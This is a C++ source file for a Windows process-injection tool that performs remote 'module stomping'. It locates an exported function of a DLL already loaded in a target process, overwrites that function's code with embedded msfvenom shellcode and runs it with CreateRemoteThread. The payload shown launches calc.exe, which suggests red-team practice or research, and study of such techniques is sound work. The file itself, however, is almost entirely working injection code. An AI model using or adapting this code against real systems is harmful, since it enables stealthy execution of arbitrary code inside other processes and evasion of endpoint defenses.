/*
* remote module stomping: locate a sacrificial DLL in the process memory, locate a function to stomp (it'll be within the .text section, this is lazy)
* & inject calc.exe msfvenom shellcode into the target buffer, toggling the memory protection between RW and RWX
* shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f C EXITFUNC=thread
* compile: cl.exe remote-stomp.cpp ..\includes\peb-eat-utils.cpp ..\includes\utils.cpp /W0
*/
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "..\includes\peb-eat-utils.h"
#include "..\includes\utils.h"

void PrintUsage(const char* programName) {
    printf("[INFO] Usage: %s -p <PID> -d <Target_DLL> -f <Target_Function> [Options]\n", programName);
    printf("  -p : Target Process ID (PID)\n");
    printf("  -d : Name of the target DLL (e.g., wininet.dll)\n");
    printf("  -f : Name of the exported function to stomp (e.g., CommitUrlCacheEntryW)\n");
    printf("\nOptions:\n");
    printf("  -n : Enable NOP testing mode (ignores hardcoded shellcode)\n");
    printf("  -s : Number of NOP bytes to write (required if -n is used)\n");
}

int main(int argc, char *argv[]) {
    unsigned char buf[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

    DWORD pid = 0;
    char* targetDll = NULL;
    char* targetFunction = NULL;
    
    BOOL nopMode = FALSE;
    DWORD nopSize = 0;

    unsigned char* writeBuffer = NULL;
    SIZE_T writeSize = 0;

    // Parse the command line arguments using switches
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            pid = my_atoi(argv[++i]);
        } else if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            targetDll = argv[++i];
        } else if (strcmp(argv[i], "-f") == 0 && i + 1 < argc) {
            targetFunction = argv[++i];
        } else if (strcmp(argv[i], "-n") == 0) {
            nopMode = TRUE;
        } else if (strcmp(argv[i], "-s") == 0 && i + 1 < argc) {
            nopSize = (DWORD)my_atoi(argv[++i]);
        } else {
            printf("[ERROR] Invalid or incomplete argument: %s\n", argv[i]);
            PrintUsage(argv[0]);
            return -1;
        }
    }

    // Validate that all core fields were filled
    if (pid == 0 || targetDll == NULL || targetFunction == NULL) {
        printf("[ERROR] Missing required arguments!\n");
        PrintUsage(argv[0]);
        return -1;
    }

    // Validate NOP mode logic rules
    if (nopMode && nopSize == 0) {
        printf("[ERROR] NOP mode (-n) enabled, but no size (-s) specified!\n");
        PrintUsage(argv[0]);
        return -1;
    }

    // Handle buffer configuration based on mode selected
    if (nopMode) {
        printf("[*] NOP mode active. Generating %u bytes of NOP alignment data.\n", nopSize);
        writeBuffer = (unsigned char*)malloc(nopSize);
        if (writeBuffer == NULL) {
            printf("[ERROR] Memory allocation failed for NOP buffer.\n");
            return -1;
        }
        memset(writeBuffer, 0x90, nopSize);
        writeSize = nopSize;
    } else {
        writeBuffer = buf;
        writeSize = sizeof buf;
    }

    printf("[*] Running PI with target PID: %u\n", pid);

    // Open a handle to the target process
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
    if (pHandle == NULL) {
        printf("Failed to acquire process handle!\n");
        if (nopMode) free(writeBuffer);
        return -1;
    }
    printf("[*] Successfully opened handle to PID: %u\n", pid);
  
    PVOID remotePebAddr = GetRemotePebAddress(pHandle);
    if (!remotePebAddr) {
        printf("[*] ERROR: Failed to find the PEB address. Error %lu\n", GetLastError());
        CloseHandle(pHandle);
        if (nopMode) free(writeBuffer);
        return -1;
    }

    printf("[*] Target PEB located at: : 0x%016llx\n", remotePebAddr);
    
    PPEB peb_ptr = (PPEB)remotePebAddr;

    printf("[*] Attempting to locate the module base for %s.\n", targetDll);
    PVOID targetModuleBase = GetModuleBaseManualRemote(pHandle, peb_ptr, targetDll);
    if (!targetModuleBase) {
        printf("[ERROR] Failed to locate target module base.\n");
        CloseHandle(pHandle);
        if (nopMode) free(writeBuffer);
        return -1;        
    }

    printf("[*] Target DLL base located at: : 0x%016llx\n", targetModuleBase);

    LPVOID bufferAddress = (LPVOID)GetRemoteProcAddressManual(pHandle, targetModuleBase, targetFunction);  
    if (bufferAddress == NULL) {
        printf("[ERROR] Failed to locate target function %s! Error: %lu\n", targetFunction, GetLastError());
        CloseHandle(pHandle);
        if (nopMode) free(writeBuffer);
        return -1;
    }
    printf("[*] Target %s!%s located at: 0x%016llx\n", targetDll, targetFunction, bufferAddress);

    printf("[*] Press Enter to write the data to the buffer address: ");
    getchar();

    printf("[*] Writing to buffer.\n");
    // Write either the shellcode or the NOP payload to the target area
    BOOL writePayload = WriteProcessMemory(pHandle, bufferAddress, writeBuffer, writeSize, NULL);
    if (writePayload == false) {
        printf("[ERROR] Failed to write data! Using address: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
        CloseHandle(pHandle);
        if (nopMode) free(writeBuffer);
        return -1;
    }

    // Only invoke thread execution if we are in target shellcode execution mode
    if (!nopMode) {
        printf("[*] Creating a new thread.\n");
        HANDLE tHandle = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)bufferAddress, NULL, 0, NULL);
        if (tHandle == NULL) {
            printf("[ERROR] Failed to create thread within the process (PID: %u)! Error: %lu\n", pid, GetLastError());
            CloseHandle(pHandle);
            return -1;
        }

        /*
        printf("[*] Waiting for the thread to return...\n");
        WaitForSingleObject(tHandle, INFINITE);
        */
        CloseHandle(tHandle);
    } else {
        printf("[*] Skipping thread creation (NOP testing mode complete).\n");
    }

    // Clean up open structures
    CloseHandle(pHandle);
    if (nopMode) {
        free(writeBuffer);
    }

    printf("[*] Process injection operation complete.\n");
    return 0;
}